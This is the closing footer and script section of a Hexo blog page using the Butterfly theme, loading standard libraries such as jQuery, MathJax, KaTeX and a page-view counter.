href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="footer_custom_text">Photo by <a href="https://unsplash.com/@pawel_czerwinski">Paweł Czerwiński</a> on Unsplash.</div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><section class="rightside" id="rightside"><i class="fa fa-book" id="readmode" title="阅读模式"> </i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换">繁</a><i class="fa fa-moon-o nightshift" id="nightshift" title="夜间模式"></i></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>$(function () {
  $('span.katex-display').wrap('<div class="katex-wrap"></div>')
})</script><script src="/js/nightshift.js"></script><script id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zindex="-1" data-click="false"></script><script src="/js/tw_cn.js"></script><script>translateInitilization()

</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@1.2.2/instantpage.min.js" type="module"></script></body></html>